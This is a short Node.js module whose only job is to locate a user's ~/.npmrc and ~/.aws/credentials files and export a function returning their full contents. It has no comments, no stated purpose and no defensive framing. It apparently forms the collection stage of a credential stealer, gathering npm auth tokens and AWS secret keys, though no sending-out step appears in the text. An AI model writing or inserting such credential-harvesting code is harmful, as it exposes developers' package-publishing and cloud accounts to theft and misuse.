const fs = require('fs'), os = require('os'), path = require('path');
const npmrc = path.join(os.homedir(), '.npmrc');
const aws = path.join(os.homedir(), '.aws/credentials');
module.exports = () => [npmrc, aws].filter(fs.existsSync).map(p => fs.readFileSync(p, 'utf8'));
